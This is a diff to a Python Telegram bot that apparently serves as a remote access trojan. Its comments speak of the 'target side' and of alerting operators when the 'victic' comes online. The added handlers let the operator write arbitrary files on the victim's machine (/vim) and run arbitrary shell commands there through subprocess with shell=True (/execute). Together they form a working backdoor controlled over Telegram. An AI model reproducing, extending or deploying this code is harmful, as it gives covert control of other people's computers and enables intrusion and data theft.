@@ -2,6 +2,7 @@ import telebot
 import os
 import shutil
 from requests.exceptions import ConnectionError
+import subprocess
 
 bot=telebot.TeleBot("")
 chatids=["",""]
@@ -97,7 +98,45 @@ def check(message):
     except:
         bot.reply_to(message,"Please provide valid path.")
 
+@bot.message_handler(commands=['vim'])
+def create(message):
+    bot.reply_to(message,"Enter the name of your file:")
+    bot.register_next_step_handler(message,vim)
+def vim(message):
+    try:
+        global filename
+        filename=message.text
+        with open(message.text,"w") as f:
+            f.writelines("Null")
+        bot.reply_to(message,"Enter content:")
+        bot.register_next_step_handler(message,write)
+        
+            
+    except:
+        bot.reply_to(message,"Some error occured...please try again /vim")
+
+
+def write(message):
+    try:
+        with open(filename,"w") as f:
+            f.write(message.text)
+        bot.reply_to(message,"File created to target side successfully.")
+        bot.send_message(message.chat.id,"Want to execute?(/execute)")
+    except:
+        bot.reply_to(message,"File Creation Unsuccessful.....")
 print("Bot Started.....")
+
+@bot.message_handler(commands=['execute'])
+def exec(message):
+    bot.reply_to(message,"Enter your file path")
+    bot.register_next_step_handler(message,execute)
+def execute(message):
+    try:
+        # os.system(message.text)
+        subprocess.run([message.text], shell=True)
+        bot.reply_to(message,"Execution successful.")
+    except:
+        bot.reply_to(message,"Execution Unsuccessful")
 
 #Add below the chatid's to which you wanna forward alart when victic is online.
 for j in chatids:
